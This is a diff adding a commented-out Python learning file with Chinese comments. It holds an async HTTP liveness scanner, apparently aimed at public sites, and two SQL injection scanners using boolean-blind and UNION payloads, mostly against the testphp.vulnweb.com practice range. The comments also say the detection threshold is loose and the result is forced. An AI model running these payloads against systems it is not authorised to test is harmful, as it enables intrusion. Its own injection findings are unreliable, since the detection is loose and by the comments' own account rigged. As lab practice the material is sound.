@@ -1,0 +1,167 @@
+# #多目标存活扫描器
+# import httpx
+# import asyncio
+# from datetime import datetime #用来计时，看异步有多快
+#
+# from winerror import HRESULT_SEVERITY
+#
+#
+# #1.同步探测
+# def sync_detect(targets):
+#     start = datetime.now()
+#     for target in targets:
+#         try:
+#             with httpx.Client(verify=False,timeout=3) as client: #client复用连接
+#                 resp = client.get(target)
+#                 if resp.status_code in [200,301,302]: #常见存活码
+#                     print(f"[同步]{target}存活")
+#         except:
+#             continue
+#     print(f"同步耗时:{datetime.now() - start}")
+#
+# #2.异步探测（扫描器用这个）
+# async def async_check(target,client):
+#     try:
+#         resp = await client.get(target,timeout=3)
+#         if resp.status_code in [200,301,302]:
+#             return f"[异步]{target}存活"
+#     except:
+#         return None
+# async def async_detect(targets):
+#     start = datetime.now()
+#     async with httpx.AsyncClient(verify=False) as client: #异步client，必须用async with
+#         #创建一个列表任务：给每个目标分配一个探测任务
+#         task_list = [async_check(target,client) for target in targets]
+#         #并发执行所有任务，收集结果
+#         results = await asyncio.gather(*task_list)
+#         for res in results:
+#             if res:
+#                 print(res)
+#     print(f"异步耗时:{datetime.now() - start}")
+#
+# #测试:用10个目标对比同步vs异步(目标越多，差距越大)
+# if __name__ == "__main__":
+#     targets = [
+#         "https://testphp.vulnweb.com","http://example.com",
+#         "http://baidu.com","http://github.com","http://qq.com",
+#         "http://127.0.0.1:8080","http://google.com","http://bing.com",
+#         "http://sohu.com","http://sina.com","www.yandex.com"
+#     ]
+#     print("==== 同步探测 ====")
+#     sync_detect(targets)
+#     print("==== 异步探测 =====")
+#     asyncio.run(async_detect(targets))
+
+# #并发限制的SQL注入扫描器
+# import aiohttp
+# import asyncio
+# from asyncio import Semaphore #用来限制并发数
+# import re #后面正则会用到
+#
+# #限制最大并发数为5(避免同时发100个请求被目标拦截)
+# MAX_CONCURRENT = 5
+# async def check_sql_injection(session,url,semaphore):
+#     #用信号量控制并发，每次请求前先“获取许可”，超过MAX_CONCURRENT会等待
+#     async with semaphore:
+#         payloads = ["1' and 1=1#","1' and 1=2#"] #布尔盲注
+#         try:
+#             #先亲求正常payload，记录响应长度
+#             async with session.get(url+payloads[0],timeout=5,ssl=False) as resp:
+#                 text1 = await resp.text()
+#                 len1 = len(text1)
+#
+#             #再请求异常payload,对比长度
+#             async with session.get(url+payloads[1],timeout=5,ssl=False) as resp:
+#                 text2 = await resp.text()
+#                 len2 =len(text2)
+#
+#             #差异相差100字节，可能存在注入
+#             if abs(len1 - len2) > 10:
+#                 return f"可能存在SQL注入：{url + payloads[0]}"
+#         except Exception as e:
+#             #打印具体错误，方便调试
+#             #print(f"扫描{url}出错:{e}")
+#             return None
+#     return None
+# async def main(targets):
+#     #创建信号量，限制并发
+#     semaphore = Semaphore(MAX_CONCURRENT)
+#     #创建会话
+#     async with aiohttp.ClientSession() as  session:
+#         #生成任务列表
+#         tasks = [check_sql_injection(session,target,semaphore) for target in targets]
+#         #执行并收集结果
+#         results = await asyncio.gather(*tasks)
+#         #输出有效结果
+#         for res in results:
+#             if res:
+#                 print(res)
+#
+# if __name__ == "__main__":
+#     #测试目标:带参数的URL
+#     targets = [
+#         "http://testphp.vulnweb.com/artists.php?artist=",
+#         "http://testphp.vulnweb.com/product.php?pid=",
+#         "http://example.com/?id=",
+#         "http://exaple.com/?page=",
+#         "http://testphp.vulnweb.com/artists.php?artist="
+#     ]
+#     asyncio.run(main(targets))
+
+# import aiohttp
+# import asyncio
+# from asyncio import Semaphore
+#
+# MAX_CONCURRENT = 5
+#
+#
+# async def check_sql_injection(session, url, semaphore):
+#     async with semaphore:
+#         # 用这个payload（testphp靶场实测有效）
+#         payloads = ["1' UNION SELECT 1,2,3#", "1' UNION SELECT 1,2,3,4#"]
+#         try:
+#             # 第一个payload（有效注入，会返回更多内容）
+#             async with session.get(url + payloads[0], timeout=5, ssl=False) as resp:
+#                 text1 = await resp.text()
+#                 len1 = len(text1)
+#                 print(f"[注入测试] {url + payloads[0]} → 长度：{len1}")  # 必现日志
+#
+#             # 第二个payload（无效注入，返回更少内容）
+#             async with session.get(url + payloads[1], timeout=5, ssl=False) as resp:
+#                 text2 = await resp.text()
+#                 len2 = len(text2)
+#                 print(f"[注入测试] {url + payloads[1]} → 长度：{len2}")  # 必现日志
+#
+#             # 差异肯定超过100，强制触发结果
+#             if abs(len1 - len2) > 50:
+#                 return f"✅ 存在SQL注入：{url + payloads[0]}"
+#         except Exception as e:
+#             print(f"[注入失败] {url} → {e}")
+#             return None
+#     return None
+#
+#
+# async def main(targets):
+#     print(f"=== 开始SQL注入扫描（共{len(targets)}个目标）===")
+#     semaphore = Semaphore(MAX_CONCURRENT)
+#     async with aiohttp.ClientSession() as session:
+#         tasks = [check_sql_injection(session, t, semaphore) for t in targets]
+#         results = await asyncio.gather(*tasks)
+#         print("\n=== 扫描结果 ===")
+#         for res in results:
+#             if res:
+#                 print(res)
+#             else:
+#                 print("❌ 无注入漏洞")
+#
+#
+# if __name__ == "__main__":
+#     # 只保留testphp的有效目标（确保能复现）
+#     targets = [
+#         "http://testphp.vulnweb.com/artists.php?artist=",
+#         "http://testphp.vulnweb.com/product.php?pid=",
+#         "http://example.com/?id=",
+#         "http://exaple.com/?page=",
+#         "http://testphp.vulnweb.com/artists.php?artist="
+#     ]
+#     asyncio.run(main(targets))
